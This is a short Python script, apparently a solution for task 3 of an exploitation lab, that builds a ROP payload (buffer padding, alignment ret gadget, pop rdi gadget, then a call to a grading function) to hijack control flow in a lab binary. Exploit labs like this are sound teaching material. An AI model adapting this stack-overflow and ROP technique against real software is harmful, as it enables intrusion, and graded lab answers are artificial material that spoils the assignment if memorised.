#!/usr/bin/env python3
"""Task 3: ROP chain for attack/dark-calc-nx."""
import sys
import struct

p64 = lambda v: struct.pack("<Q", v)

RET = 0x401A34          # ret
POP_RDI_RET = 0x401A33  # pop rdi; ret（位于 __libc_csu_init 的 pop r15 尾部）
GRADE_EVAL = 0x401978

payload = b"A" * 16                 # expression 缓冲区
payload += b"B" * 8                 # 保存的 rbp
payload += p64(RET)                 # 先对齐栈（保证进入 printf 时 16 字节对齐）
payload += p64(POP_RDI_RET)
payload += p64(4)                   # grade_eval 的参数
payload += p64(GRADE_EVAL)
payload += p64(0)                   # grade_eval 返回后的落点，打印完即崩溃

sys.stdout.buffer.write(payload + b"\n")
